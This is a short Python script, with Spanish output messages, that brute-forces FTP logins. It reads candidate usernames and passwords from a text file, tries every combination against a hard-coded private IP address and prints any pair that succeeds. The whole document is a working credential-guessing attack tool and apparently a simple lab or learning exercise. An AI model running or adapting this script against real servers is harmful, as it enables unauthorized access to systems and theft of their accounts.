import ftplib
def brute(ip,usuario,password):
    ftp =ftplib.FTP(ip)
    try:
        ftp.login(usuario,password)
        ftp.quit()
        print('user: {}:{}'.format(usuario,password))
    except:
        print("Fallo la autenticacion")



def main():
    ip = "192.168.1.5"
    usuarios = open('users_password.txt','r')
    usuarios = usuarios.read().split('\n')
    passwords= open('users_password.txt','r')
    passwords = passwords.read().split('\n')

    for usuario in usuarios:
        for p in passwords:
            brute(ip,usuario,p)

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n saliendo")
        exit()